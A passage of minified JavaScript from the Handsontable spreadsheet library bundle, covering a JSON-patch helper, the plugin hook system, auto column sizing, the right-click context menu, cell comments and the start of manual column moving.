m(e,t){if(Object.observe){Object.unobserve(t,e);for(var n in t){if(t.hasOwnProperty(n)){var r=t[n];if(r&&typeof r==="object"){m(e,r)}}}}return e}function g(e){if(Object.observe){Object.deliverChangeRecords(e)}else{var t;for(var n=0,r=u.length;n<r;n++){if(u[n].obj===e.object){t=u[n];break}}b(t.value,e.object,e.patches,"")}var i=e.patches;if(i.length>0){e.patches=[];if(e.callback){e.callback(i)}}return i}function b(e,t,n,r){try{var s=y(t);var o=y(e);var u=false;var a=false;for(var f=o.length-1;f>=0;f--){var l=o[f];var c=e[l];if(t.hasOwnProperty(l)){var h=t[l];if(c instanceof Object){b(c,h,n,r+"/"+i(l))}else{if(c!=h){u=true;n.push({op:"replace",path:r+"/"+i(l),value:h});e[l]=h}}}else{n.push({op:"remove",path:r+"/"+i(l)});delete e[l];a=true}}if(!a&&s.length==o.length){return}for(var f=0;f<s.length;f++){var l=s[f];if(!e.hasOwnProperty(l)){n.push({op:"add",path:r+"/"+i(l),value:t[l]});e[l]=JSON.parse(JSON.stringify(t[l]))}}}catch(p){}}function E(e,r){var i=false,s=0,o=r.length,u;while(s<o){u=r[s];var a=u.path.split("/");var f=e;var l=1;var c=a.length;while(true){if(w(f)){var h=parseInt(a[l],10);l++;if(l>=c){i=n[u.op].call(u,f,h,e);break}f=f[h]}else{var p=a[l];if(p.indexOf("~")!=-1)p=p.replace(/~1/g,"/").replace(/~0/g,"~");l++;if(l>=c){i=t[u.op].call(u,f,p,e);break}f=f[p]}}s++}return i}var t={add:function(e,t){e[t]=this.value;return true},remove:function(e,t){delete e[t];return true},replace:function(e,t){e[t]=this.value;return true},move:function(e,t,n){var r={op:"_get",path:this.from};E(n,[r]);E(n,[{op:"remove",path:this.from}]);E(n,[{op:"add",path:this.path,value:r.value}]);return true},copy:function(e,t,n){var r={op:"_get",path:this.from};E(n,[r]);E(n,[{op:"add",path:this.path,value:r.value}]);return true},test:function(e,t){return JSON.stringify(e[t])===JSON.stringify(this.value)},_get:function(e,t){this.value=e[t]}};var n={add:function(e,t){e.splice(t,0,this.value);return true},remove:function(e,t){e.splice(t,1);return true},replace:function(e,t){e[t]=this.value;return true},move:t.move,copy:t.copy,test:t.test,_get:t._get};var r={add:function(e,t){var n={op:"add",path:t+i(this.name),value:this.object[this.name]};e.push(n)},"delete":function(e,t){var n={op:"remove",path:t+i(this.name)};e.push(n)},update:function(e,t){var n={op:"replace",path:t+i(this.name),value:this.object[this.name]};e.push(n)}};var u=[];e.intervals;var a=function(){function e(e){this.observers=[];this.obj=e}return e}();var f=function(){function e(e,t){this.callback=e;this.observer=t}return e}();e.unobserve=p;e.observe=d;e.generate=g;var y;if(Object.keys){y=Object.keys}else{y=function(e){var t=[];for(var n in e){if(e.hasOwnProperty(n)){t.push(n)}}return t}}var w;if(Array.isArray){w=Array.isArray}else{w=function(e){return e.push&&typeof e.length==="number"}}e.apply=E})(jsonpatch||(jsonpatch={}));if(typeof exports!=="undefined"){exports.apply=jsonpatch.apply;exports.observe=jsonpatch.observe;exports.unobserve=jsonpatch.unobserve;exports.generate=jsonpatch.generate}Handsontable.PluginHookClass=function(){function n(){this.hooks=e();this.globalBucket={};this.legacy=t}var e=function(){return{beforeInitWalkontable:[],beforeInit:[],beforeRender:[],beforeSetRangeEnd:[],beforeDrawBorders:[],beforeChange:[],beforeChangeRender:[],beforeRemoveCol:[],beforeRemoveRow:[],beforeValidate:[],beforeGetCellMeta:[],beforeAutofill:[],beforeKeyDown:[],beforeOnCellMouseDown:[],afterInit:[],afterLoadData:[],afterUpdateSettings:[],afterRender:[],afterRenderer:[],afterChange:[],afterValidate:[],afterGetCellMeta:[],afterSetCellMeta:[],afterGetColHeader:[],afterGetRowHeader:[],afterDestroy:[],afterRemoveRow:[],afterCreateRow:[],afterRemoveCol:[],afterCreateCol:[],afterDeselect:[],afterSelection:[],afterSelectionByProp:[],afterSelectionEnd:[],afterSelectionEndByProp:[],afterOnCellMouseDown:[],afterOnCellMouseOver:[],afterOnCellCornerMouseDown:[],afterScrollVertically:[],afterScrollHorizontally:[],afterCellMetaReset:[],afterIsMultipleSelectionCheck:[],afterDocumentKeyDown:[],modifyColWidth:[],modifyRowHeight:[],modifyRow:[],modifyCol:[]}};var t={onBeforeChange:"beforeChange",onChange:"afterChange",onCreateRow:"afterCreateRow",onCreateCol:"afterCreateCol",onSelection:"afterSelection",onCopyLimit:"afterCopyLimit",onSelectionEnd:"afterSelectionEnd",onSelectionByProp:"afterSelectionByProp",onSelectionEndByProp:"afterSelectionEndByProp"};n.prototype.getBucket=function(e){if(e){if(!e.pluginHookBucket){e.pluginHookBucket={}}return e.pluginHookBucket}return this.globalBucket};n.prototype.add=function(e,n,r){if(Handsontable.helper.isArray(n)){for(var i=0,s=n.length;i<s;i++){this.add(e,n[i])}}else{if(e in t){e=t[e]}var o=this.getBucket(r);if(typeof o[e]==="undefined"){o[e]=[]}n.skip=false;if(o[e].indexOf(n)==-1){o[e].push(n)}}return this};n.prototype.once=function(e,t,n){if(Handsontable.helper.isArray(t)){for(var r=0,i=t.length;r<i;r++){t[r].runOnce=true;this.add(e,t[r],n)}}else{t.runOnce=true;this.add(e,t,n)}};n.prototype.remove=function(e,n,r){var i=false;if(e in t){e=t[e]}var s=this.getBucket(r);if(typeof s[e]!=="undefined"){for(var o=0,u=s[e].length;o<u;o++){if(s[e][o]==n){s[e][o].skip=true;i=true;break}}}return i};n.prototype.run=function(e,n,r,i,s,o,u,a){if(n in t){n=t[n]}this._runBucket(this.globalBucket,e,n,r,i,s,o,u,a);this._runBucket(this.getBucket(e),e,n,r,i,s,o,u,a)};n.prototype._runBucket=function(e,t,n,r,i,s,o,u,a){var f=e[n];if(f){for(var l=0,c=f.length;l<c;l++){if(!f[l].skip){f[l].call(t,r,i,s,o,u,a);if(f[l].runOnce){this.remove(n,f[l],e===this.globalBucket?null:t)}}}}};n.prototype.destroy=function(e){var t=this.getBucket(e);for(var n in t){if(t.hasOwnProperty(n)){for(var r=0,i=t[n].length;r<i;r++){this.remove(n,t[n],e)}}}};n.prototype.execute=function(e,n,r,i,s,o,u,a){if(n in t){n=t[n]}r=this._executeBucket(this.globalBucket,e,n,r,i,s,o,u,a);r=this._executeBucket(this.getBucket(e),e,n,r,i,s,o,u,a);return r};n.prototype._executeBucket=function(e,t,n,r,i,s,o,u,a){var f,l=e[n];if(l){for(var c=0,h=l.length;c<h;c++){if(!l[c].skip){f=l[c].call(t,r,i,s,o,u,a);if(f!==void 0){r=f}if(l[c].runOnce){this.remove(n,l[c],e===this.globalBucket?null:t)}if(f===false){return false}}}}return r};n.prototype.register=function(e){if(!this.isRegistered(e)){this.hooks[e]=[]}};n.prototype.deregister=function(e){delete this.hooks[e]};n.prototype.isRegistered=function(e){return typeof this.hooks[e]!=="undefined"};n.prototype.getRegistered=function(){return Object.keys(this.hooks)};return n}();Handsontable.hooks=new Handsontable.PluginHookClass;Handsontable.PluginHooks=Handsontable.hooks;(function(e){function t(){function i(e){var t=document,n=this;n.table=t.createElement("table");n.theadTh=t.createElement("th");n.table.appendChild(t.createElement("thead")).appendChild(t.createElement("tr")).appendChild(n.theadTh);n.tableStyle=n.table.style;n.tableStyle.tableLayout="auto";n.tableStyle.width="auto";n.tbody=t.createElement("tbody");n.table.appendChild(n.tbody);n.container=t.createElement("div");n.container.className=e.rootElement[0].className+" hidden";n.containerStyle=n.container.style;n.container.appendChild(n.table)}var t=this,r=5;this.beforeInit=function(){var e=this;e.autoColumnWidths=[];if(e.getSettings().autoColumnSize!==false){if(!e.autoColumnSizeTmp){e.autoColumnSizeTmp={table:null,tableStyle:null,theadTh:null,tbody:null,container:null,containerStyle:null,determineBeforeNextRender:true};e.addHook("beforeRender",n.determineIfChanged);e.addHook("modifyColWidth",n.modifyColWidth);e.addHook("afterDestroy",n.afterDestroy);e.determineColumnWidth=t.determineColumnWidth}}else{if(e.autoColumnSizeTmp){e.removeHook("beforeRender",n.determineIfChanged);e.removeHook("modifyColWidth",n.modifyColWidth);e.removeHook("afterDestroy",n.afterDestroy);delete e.determineColumnWidth;t.afterDestroy.call(e)}}};this.determineIfChanged=function(e){if(e){n.determineColumnsWidth.apply(this,arguments)}};this.determineColumnWidth=function(t){var n=this,s=n.autoColumnSizeTmp;if(!s.container){i.call(s,n)}s.container.className=n.rootElement[0].className+" htAutoColumnSize";s.table.className=n.$table[0].className;var o=n.countRows();var u={};var a=0;for(var f=0;f<o;f++){var l=e.helper.stringify(n.getDataAtCell(f,t));var c=l.length;if(c>a){a=c}if(!u[c]){u[c]={needed:r,strings:[]}}if(u[c].needed){u[c].strings.push({value:l,row:f});u[c].needed--}}var h=n.getSettings();if(h.colHeaders){n.view.appendColHeader(t,s.theadTh)}e.Dom.empty(s.tbody);for(var p in u){if(u.hasOwnProperty(p)){for(var d=0,v=u[p].strings.length;d<v;d++){var m=u[p].strings[d].row;var g=n.getCellMeta(m,t);g.col=t;g.row=m;var y=n.getCellRenderer(g);var b=document.createElement("tr");var w=document.createElement("td");y(n,w,m,t,n.colToProp(t),u[p].strings[d].value,g);f++;b.appendChild(w);s.tbody.appendChild(b)}}}var E=n.rootElement[0].parentNode;E.appendChild(s.container);var S=e.Dom.outerWidth(s.table);E.removeChild(s.container);return S};this.determineColumnsWidth=function(){var e=this;var n=this.getSettings();if(n.autoColumnSize||!n.colWidths){var r=this.countCols();for(var i=0;i<r;i++){if(!e._getColWidthFromSettings(i)){this.autoColumnWidths[i]=t.determineColumnWidth.call(e,i)}}}};this.modifyColWidth=function(e,t){if(this.autoColumnWidths[t]&&this.autoColumnWidths[t]>e){return this.autoColumnWidths[t]}return e};this.afterDestroy=function(){var e=this;if(e.autoColumnSizeTmp&&e.autoColumnSizeTmp.container&&e.autoColumnSizeTmp.container.parentNode){e.autoColumnSizeTmp.container.parentNode.removeChild(e.autoColumnSizeTmp.container)}e.autoColumnSizeTmp=null}}var n=new t;e.hooks.add("beforeInit",n.beforeInit);e.hooks.add("afterUpdateSettings",n.beforeInit)})(Handsontable);var htSortColumn=new HandsontableColumnSorting;Handsontable.hooks.add("afterInit",function(){htSortColumn.init.call(this,"afterInit")});Handsontable.hooks.add("afterUpdateSettings",function(){htSortColumn.init.call(this,"afterUpdateSettings")});Handsontable.hooks.add("modifyRow",htSortColumn.translateRow);Handsontable.hooks.add("afterGetColHeader",htSortColumn.getColHeader);Handsontable.hooks.register("beforeColumnSort");Handsontable.hooks.register("afterColumnSort");(function(e){"use strict";function t(e,t){if(e.indexOf(t)!=-1){return e}e=e.replace("htTop","").replace("htMiddle","").replace("htBottom","").replace("  ","");e+=" "+t;return e}function n(e,t){if(e.indexOf(t)!=-1){return e}e=e.replace("htLeft","").replace("htCenter","").replace("htRight","").replace("htJustify","").replace("  ","");e+=" "+t;return e}function r(e,r,i,s){var o=this.getCellMeta(e,r),u=s;if(o.className){if(i==="vertical"){u=t(o.className,s)}else{u=n(o.className,s)}}this.setCellMeta(e,r,"className",u);this.render()}function i(e,t,n){if(e.from.row==e.to.row&&e.from.col==e.to.col){r.call(this,e.from.row,e.from.col,t,n)}else{for(var i=e.from.row;i<=e.to.row;i++){for(var s=e.from.col;s<=e.to.col;s++){r.call(this,i,s,t,n)}}}}function s(t,n){this.instance=t;var r=this;r.menus=[];r.triggerRows=[];this.enabled=true;this.instance.addHook("afterDestroy",function(){r.destroy()});this.defaultOptions={items:[{key:"row_above",name:"Insert row above",callback:function(e,t){this.alter("insert_row",t.start.row)},disabled:function(){var e=this.getSelected(),t=[0,e[1],this.view.wt.wtTable.getRowStrategy().cellCount-1,e[1]],n=t.join(",")==e.join(",");return e[0]<0||this.countRows()>=this.getSettings().maxRows||n}},{key:"row_below",name:"Insert row below",callback:function(e,t){this.alter("insert_row",t.end.row+1)},disabled:function(){var e=this.getSelected(),t=[0,e[1],this.view.wt.wtTable.getRowStrategy().cellCount-1,e[1]],n=t.join(",")==e.join(",");return this.getSelected()[0]<0||this.countRows()>=this.getSettings().maxRows||n}},s.SEPARATOR,{key:"col_left",name:"Insert column on the left",callback:function(e,t){this.alter("insert_col",t.start.col)},disabled:function(){var e=this.getSelected(),t=[e[0],0,e[0],this.view.wt.wtTable.getColumnStrategy().cellCount-1],n=t.join(",")==e.join(",");return this.getSelected()[1]<0||this.countCols()>=this.getSettings().maxCols||n}},{key:"col_right",name:"Insert column on the right",callback:function(e,t){this.alter("insert_col",t.end.col+1)},disabled:function(){var e=this.getSelected(),t=[e[0],0,e[0],this.view.wt.wtTable.getColumnStrategy().cellCount-1],n=t.join(",")==e.join(",");return e[1]<0||this.countCols()>=this.getSettings().maxCols||n}},s.SEPARATOR,{key:"remove_row",name:"Remove row",callback:function(e,t){var n=t.end.row-t.start.row+1;this.alter("remove_row",t.start.row,n)},disabled:function(){var e=this.getSelected(),t=[0,e[1],this.view.wt.wtTable.getRowStrategy().cellCount-1,e[1]],n=t.join(",")==e.join(",");return e[0]<0||n}},{key:"remove_col",name:"Remove column",callback:function(e,t){var n=t.end.col-t.start.col+1;this.alter("remove_col",t.start.col,n)},disabled:function(){var e=this.getSelected(),t=[e[0],0,e[0],this.view.wt.wtTable.getColumnStrategy().cellCount-1],n=t.join(",")==e.join(",");return e[1]<0||n}},s.SEPARATOR,{key:"undo",name:"Undo",callback:function(){this.undo()},disabled:function(){return this.undoRedo&&!this.undoRedo.isUndoAvailable()}},{key:"redo",name:"Redo",callback:function(){this.redo()},disabled:function(){return this.undoRedo&&!this.undoRedo.isRedoAvailable()}},s.SEPARATOR,{key:"make_read_only",name:function(){var e="Read only";var t=r.checkSelectionReadOnlyConsistency(this);if(t){e=r.markSelected(e)}return e},callback:function(){var e=r.checkSelectionReadOnlyConsistency(this);var t=this;this.getSelectedRange().forAll(function(n,r){t.getCellMeta(n,r).readOnly=e?false:true});this.render()}},s.SEPARATOR,{key:"alignment",name:"Alignment",submenu:{items:[{name:function(){var e="Left";var t=r.checkSelectionAlignment(this,"htLeft");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"horizontal","htLeft")},disabled:false},{name:function(){var e="Center";var t=r.checkSelectionAlignment(this,"htCenter");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"horizontal","htCenter")},disabled:false},{name:function(){var e="Right";var t=r.checkSelectionAlignment(this,"htRight");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"horizontal","htRight")},disabled:false},{name:function(){var e="Justify";var t=r.checkSelectionAlignment(this,"htJustify");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"horizontal","htJustify")},disabled:false},s.SEPARATOR,{name:function(){var e="Top";var t=r.checkSelectionAlignment(this,"htTop");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"vertical","htTop")},disabled:false},{name:function(){var e="Middle";var t=r.checkSelectionAlignment(this,"htMiddle");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"vertical","htMiddle")},disabled:false},{name:function(){var e="Bottom";var t=r.checkSelectionAlignment(this,"htBottom");if(t){e=r.markSelected(e)}return e},callback:function(){i.call(this,this.getSelectedRange(),"vertical","htBottom")},disabled:false}]}}]};r.options={};e.helper.extend(r.options,this.options);this.bindMouseEvents();this.markSelected=function(e){return"<span class='selected'></span>"+e};this.checkSelectionAlignment=function(e,t){var n=false;e.getSelectedRange().forAll(function(r,i){var s=e.getCellMeta(r,i).className;if(s&&s.indexOf(t)!=-1){n=true;return false}});return n};this.checkSelectionReadOnlyConsistency=function(e){var t=false;e.getSelectedRange().forAll(function(n,r){if(e.getCellMeta(n,r).readOnly){t=true;return false}});return t};e.hooks.run(t,"afterContextMenuDefaultOptions",this.defaultOptions)}function o(e,t){for(var n=0,r=e.length;n<r;n++){if(e[n].key===t){return e[n]}}}function u(){if(this.rootElement[0].className.indexOf("htContextMenu")){return}var e=0,t=0,n=this.getSettings().data.length;for(var r=0;r<n;r++){if(this.getSettings().data[r].name==s.SEPARATOR.name){e+=2}else{t+=26}}this.view.wt.wtScrollbars.vertical.fixedContainer.style.height=t+e+"px"}function a(){var t=this;var n=t.getSettings().contextMenu;var r=e.helper.isObject(n)?n:{};if(n){if(!t.contextMenu){t.contextMenu=new s(t,r)}t.contextMenu.enable()}else if(t.contextMenu){t.contextMenu.destroy();delete t.contextMenu}}s.prototype.createMenu=function(t,n){if(t){t=t.replace(/ /g,"_");t="htContextSubMenu_"+t}var r;if(t){r=$("body > .htContextMenu."+t)[0]}else{r=$("body > .htContextMenu")[0]}if(!r){r=document.createElement("DIV");e.Dom.addClass(r,"htContextMenu");if(t){e.Dom.addClass(r,t)}document.getElementsByTagName("body")[0].appendChild(r)}if(this.menus.indexOf(r)<0){this.menus.push(r);n=n||0;this.triggerRows.push(n)}return r};s.prototype.bindMouseEvents=function(){function t(t){var n=this.instance.getSettings();this.closeAll();t.preventDefault();t.stopPropagation();var r=this.instance.getSettings().rowHeaders,i=this.instance.getSettings().colHeaders;if(!(r||i)){if(t.target.nodeName!="TD"&&!(e.Dom.hasClass(t.target,"current")&&e.Dom.hasClass(t.target,"wtBorder"))){return}}var o=this.createMenu();var u=this.getItems(n.contextMenu);this.show(o,u);this.setMenuPosition(t,o);$(document).on("mousedown.htContextMenu",e.helper.proxy(s.prototype.closeAll,this))}this.instance.rootElement.on("contextmenu.htContextMenu",e.helper.proxy(t,this))};s.prototype.bindTableEvents=function(){var e=this;this._afterScrollCallback=function(){};this.instance.addHook("afterScrollVertically",this._afterScrollCallback);this.instance.addHook("afterScrollHorizontally",this._afterScrollCallback)};s.prototype.unbindTableEvents=function(){if(this._afterScrollCallback){this.instance.removeHook("afterScrollVertically",this._afterScrollCallback);this.instance.removeHook("afterScrollHorizontally",this._afterScrollCallback);this._afterScrollCallback=null}};s.prototype.performAction=function(e,t){var n=this;var r=$(t).handsontable("getInstance");var i=r.getSelected()[0];var o=r.getData()[i];if(o.disabled===true||typeof o.disabled=="function"&&o.disabled.call(this.instance)===true){return}if(!o.hasOwnProperty("submenu")){if(typeof o.callback!="function"){return}var u=this.instance.getSelectedRange();var a=s.utils.normalizeSelection(u);o.callback.call(this.instance,o.key,a,e);n.closeAll()}};s.prototype.unbindMouseEvents=function(){this.instance.rootElement.off("contextmenu.htContextMenu");$(document).off("mousedown.htContextMenu")};s.prototype.show=function(t,n){t.removeAttribute("style");t.style.display="block";var r=this;$(t).off("mousedown.htContextMenu").on("mousedown.htContextMenu",function(e){r.performAction(e,t)});$(t).handsontable({data:n,colHeaders:false,colWidths:[200],readOnly:true,copyPaste:false,columns:[{data:"name",renderer:e.helper.proxy(this.renderer,this)}],beforeKeyDown:function(e){r.onBeforeKeyDown(e,t)},afterOnCellMouseOver:function(e,n,i){r.onCellMouseOver(e,n,i,t)},renderAllRows:true});this.bindTableEvents();$(t).handsontable("listen")};s.prototype.close=function(e){this.hide(e);$(document).off("mousedown.htContextMenu");this.unbindTableEvents();this.instance.listen()};s.prototype.closeAll=function(){while(this.menus.length>0){var e=this.menus.pop();if(e){this.close(e)}}this.triggerRows=[]};s.prototype.closeLastOpenedSubMenu=function(){var e=this.menus.pop();if(e){this.hide(e)}};s.prototype.hide=function(e){e.style.display="none";$(e).handsontable("destroy")};s.prototype.renderer=function(t,n,r,i,o,u){function c(e){return e.hasOwnProperty("submenu")}function h(e){return(new RegExp(s.SEPARATOR.name,"i")).test(e.name)}function p(e){return e.disabled===true||typeof e.disabled=="function"&&e.disabled.call(a.instance)===true}var a=this;var f=t.getData()[r];var l=document.createElement("DIV");if(typeof u==="function"){u=u.call(this.instance)}e.Dom.empty(n);n.appendChild(l);if(h(f)){e.Dom.addClass(n,"htSeparator")}else{e.Dom.fastInnerHTML(l,u)}if(p(f)){e.Dom.addClass(n,"htDisabled");$(l).on("mouseenter",function(){t.deselectCell()})}else{if(c(f)){e.Dom.addClass(n,"htSubmenu");$(l).on("mouseenter",function(){t.selectCell(r,i)})}else{e.Dom.removeClass(n,"htSubmenu");e.Dom.removeClass(n,"htDisabled");$(l).on("mouseenter",function(){t.selectCell(r,i)})}}};s.prototype.onCellMouseOver=function(e,t,n,r){var i=$(r).handsontable("getInstance");var s=this.menus.length;if(s>0){var o=this.menus[s-1];if(o.id!=r.id){this.closeLastOpenedSubMenu()}}else{this.closeLastOpenedSubMenu()}if(n.className.indexOf("htSubmenu")!=-1){var u=i.getData()[t.row];var a=this.getItems(u.submenu);var f=this.createMenu(u.name,t.row);var l=n.getBoundingClientRect();this.show(f,a);this.setSubMenuPosition(l,f)}};s.prototype.onBeforeKeyDown=function(t,n){function c(e){var t=e.getCell(0,0);if(s.utils.isSeparator(t)||s.utils.isDisabled(t)){p(0,0,e)}else{e.selectCell(0,0)}}function h(e){var t=e.countRows()-1;var n=e.getCell(t,0);if(s.utils.isSeparator(n)||s.utils.isDisabled(n)){d(t,0,e)}else{e.selectCell(t,0)}}function p(e,t,n){var r=e+1;var i=r<n.countRows()?n.getCell(r,t):null;if(!i){return}if(s.utils.isSeparator(i)||s.utils.isDisabled(i)){p(r,t,n)}else{n.selectCell(r,t)}}function d(e,t,n){var r=e-1;var i=r>=0?n.getCell(r,t):null;if(!i){return}if(s.utils.isSeparator(i)||s.utils.isDisabled(i)){d(r,t,n)}else{n.selectCell(r,t)}}function v(e,t,n,r){var i=e.getData()[r];var s=t.getItems(i.submenu);var o=t.createMenu(i.name,r);var u=n.getBoundingClientRect();t.show(o,s);t.setSubMenuPosition(u,o);var a=$(o).handsontable("getInstance");a.selectCell(0,0)}var r=this;var i=$(n).handsontable("getInstance");var o=i.getSelected();switch(t.keyCode){case e.helper.keyCode.ESCAPE:r.closeAll();t.preventDefault();t.stopImmediatePropagation();break;case e.helper.keyCode.ENTER:if(o){r.performAction(t,n)}break;case e.helper.keyCode.ARROW_DOWN:if(!o){c(i,r)}else{p(o[0],o[1],i,r)}t.preventDefault();t.stopImmediatePropagation();break;case e.helper.keyCode.ARROW_UP:if(!o){h(i,r)}else{d(o[0],o[1],i,r)}t.preventDefault();t.stopImmediatePropagation();break;case e.helper.keyCode.ARROW_RIGHT:if(o){var u=o[0];var a=i.getCell(o[0],0);if(s.utils.hasSubMenu(a)){v(i,r,a,u)}}t.preventDefault();t.stopImmediatePropagation();break;case e.helper.keyCode.ARROW_LEFT:if(o){if(n.className.indexOf("htContextSubMenu_")!=-1){r.closeLastOpenedSubMenu();var f=r.menus.length;if(f>0){n=r.menus[f-1];var l=r.triggerRows.pop();i=$(n).handsontable("getInstance");i.selectCell(l,0)}}t.preventDefault();t.stopImmediatePropagation()}break}};s.prototype.getItems=function(t){function i(t){if(typeof t=="string"){this.name=t}else{e.helper.extend(this,t)}}var n,r;i.prototype=t;if(t&&t.items){t=t.items}if(t===true){t=this.defaultOptions.items}if(1==1){n=[];for(var s in t){if(t.hasOwnProperty(s)){if(typeof t[s]==="string"){r=o(this.defaultOptions.items,t[s])}else{r=o(this.defaultOptions.items,s)}if(!r){r=t[s]}r=new i(r);if(typeof t[s]==="object"){e.helper.extend(r,t[s])}if(!r.key){r.key=s}n.push(r)}}}return n};s.prototype.setSubMenuPosition=function(t,n){var r=e.Dom.getWindowScrollTop();var i=e.Dom.getWindowScrollLeft();var s={top:r+t.top,topRelative:t.top,left:t.left,leftRelative:t.left-i,scrollTop:r,scrollLeft:i,cellHeight:t.height,cellWidth:t.width};if(this.menuFitsBelowCursor(s,n)){this.positionMenuBelowCursor(s,n,true)}else{if(this.menuFitsAboveCursor(s,n)){this.positionMenuAboveCursor(s,n,true)}else{this.positionMenuBelowCursor(s,n,true)}}if(this.menuFitsOnRightOfCursor(s,n)){this.positionMenuOnRightOfCursor(s,n,true)}else{this.positionMenuOnLeftOfCursor(s,n,true)}};s.prototype.setMenuPosition=function(t,n){var r=t.pageY;var i=t.pageX;var s=e.Dom.getWindowScrollTop();var o=e.Dom.getWindowScrollLeft();var u={top:r,topRelative:r-s,left:i,leftRelative:i-o,scrollTop:s,scrollLeft:o,cellHeight:t.target.clientHeight,cellWidth:t.target.clientWidth};if(this.menuFitsBelowCursor(u,n)){this.positionMenuBelowCursor(u,n)}else{if(this.menuFitsAboveCursor(u,n)){this.positionMenuAboveCursor(u,n)}else{this.positionMenuBelowCursor(u,n)}}if(this.menuFitsOnRightOfCursor(u,n)){this.positionMenuOnRightOfCursor(u,n)}else{this.positionMenuOnLeftOfCursor(u,n)}};s.prototype.menuFitsAboveCursor=function(e,t){return e.topRelative>=t.offsetHeight};s.prototype.menuFitsBelowCursor=function(e,t){return e.topRelative+t.offsetHeight<=e.scrollTop+document.body.clientHeight};s.prototype.menuFitsOnRightOfCursor=function(e,t){return e.leftRelative+t.offsetWidth<=e.scrollLeft+document.body.clientWidth};s.prototype.positionMenuBelowCursor=function(e,t){t.style.top=e.top+"px"};s.prototype.positionMenuAboveCursor=function(e,t,n){if(n){t.style.top=e.top+e.cellHeight-t.offsetHeight+"px"}else{t.style.top=e.top-t.offsetHeight+"px"}};s.prototype.positionMenuOnRightOfCursor=function(e,t,n){if(n){t.style.left=1+e.left+e.cellWidth+"px"}else{t.style.left=1+e.left+"px"}};s.prototype.positionMenuOnLeftOfCursor=function(e,t,n){if(n){t.style.left=e.left-t.offsetWidth+"px"}else{t.style.left=e.left-t.offsetWidth+"px"}};s.utils={};s.utils.normalizeSelection=function(e){return{start:e.getTopLeftCorner(),end:e.getBottomRightCorner()}};s.utils.isSeparator=function(t){return e.Dom.hasClass(t,"htSeparator")};s.utils.hasSubMenu=function(t){return e.Dom.hasClass(t,"htSubmenu")};s.utils.isDisabled=function(t){return e.Dom.hasClass(t,"htDisabled")};s.prototype.enable=function(){if(!this.enabled){this.enabled=true;this.bindMouseEvents()}};s.prototype.disable=function(){if(this.enabled){this.enabled=false;this.closeAll();this.unbindMouseEvents();this.unbindTableEvents()}};s.prototype.destroy=function(){this.closeAll();while(this.menus.length>0){var e=this.menus.pop();this.triggerRows.pop();if(e){this.close(e);if(!this.isMenuEnabledByOtherHotInstance()){this.removeMenu(e)}}}this.unbindMouseEvents();this.unbindTableEvents()};s.prototype.isMenuEnabledByOtherHotInstance=function(){var e=$(".handsontable");var t=false;for(var n=0,r=e.length;n<r;n++){var i=$(e[n]).handsontable("getInstance");if(i&&i.getSettings().contextMenu){t=true;break}}return t};s.prototype.removeMenu=function(e){if(e.parentNode){this.menu.parentNode.removeChild(e)}};s.SEPARATOR={name:"---------"};e.hooks.add("afterInit",a);e.hooks.add("afterUpdateSettings",a);e.hooks.add("afterInit",u);e.PluginHooks.register("afterContextMenuDefaultOptions");e.ContextMenu=s})(Handsontable);var init=function(){var e=this;var t=e.getSettings().comments;if(t){Handsontable.Comments=new Comments(e);Handsontable.Comments.init()}},afterRenderer=function(e,t,n,r,i,s){if(s.comment){Handsontable.Dom.addClass(e,s.commentedCellClassName)}},addCommentsActionsToContextMenu=function(e){var t=this;if(!t.getSettings().comments){return}e.items.push(Handsontable.ContextMenu.SEPARATOR);e.items.push({key:"commentsAddEdit",name:function(){var e=Handsontable.Comments.checkSelectionCommentsConsistency();return e?"Edit Comment":"Add Comment"},callback:function(e,t,n){Handsontable.Comments.showComment(this.getSelectedRange())},disabled:function(){return false}});e.items.push({key:"commentsRemove",name:function(){return"Delete Comment"},callback:function(e,t,n){Handsontable.Comments.removeComment(t.start.row,t.start.col)},disabled:function(){var e=Handsontable.Comments.checkSelectionCommentsConsistency();return!e}})};Handsontable.hooks.add("beforeInit",init);Handsontable.hooks.add("afterContextMenuDefaultOptions",addCommentsActionsToContextMenu);Handsontable.hooks.add("afterRenderer",afterRenderer);(function(e){function t(){function p(e){o=this;u=e;var t=this.view.wt.wtTable.getCoords(e).col;if(t>=0){s=t;var n=u.getBoundingClientRect();i=n.left;a.style.top=n.top+"px";a.style.left=i+"px";o.rootElement[0].appendChild(a)}}function d(e){var t=e.getBoundingClientRect();a.style.left=t.left+"px"}function v(){var t=this;e.Dom.addClass(a,"active");e.Dom.addClass(f,"active");var n=u.getBoundingClientRect();f.style.width=n.width+"px";f.style.height=t.view.maximumVisibleElementHeight(0)+"px";f.style.top=a.style.top;f.style.left=i+"px";t.rootElement[0].appendChild(f)}function m(e){f.style.left=i+e+"px"}function g(){e.Dom.removeClass(a,"active");e.Dom.removeClass(f,"active")}var t,n,r,i,s,o,u,a=document.createElement("DIV"),f=document.createElement("DIV"),l=$(window);a.className="manualColumnMover";f.className="manualColumnMoverGuide";var c=function(){var t=this;e.hooks.run(t,"persistentStateSave","manualColumnPositions",t.manualColumnPositions)};var h=function(){var t=this;var n={};e.hooks.run(t,"persistentStateLoad","manualColumnPositions",n);return n.value};var y=function(){var i=this;var o;i.rootElement.on("mouseenter.manualColumnMove."+i.guid,"table thead tr > th",function(e){if(o){n=i.view.wt.wtTable.getCoords(e.currentTarget).col;d(e.currentTarget)}else{p.call(i,e.currentTarget)}});i.rootElement.on("mousedown.manualColumnMove."+i.guid,".manualColumnMover",function(e){r=e.pageX;v.call(i);o=i;t=s;n=s});l.on("mousemove.manualColumnMove."+i.guid,function(e){if(o){m(e.pageX-r)}});l.on("mouseup.manualColumnMove."+i.guid,function(){if(o){g();o=false;if(t<n){n--}w(i.manualColumnPositions,i.countCols());i.manualColumnPositions.splice(n,0,i.manualColumnPositions.splice(t,1)[0]);i.forceFullRender=true;i.view.render();c.call(i);e.hooks.run(i,"afterColumnMove",t,n);p.call(i,u)}});i.addHook("afterDestroy",b)};var b=function(){var e=this;e.rootElement.off("mouseenter.manualColumnMove."+e.guid,"table thead tr > 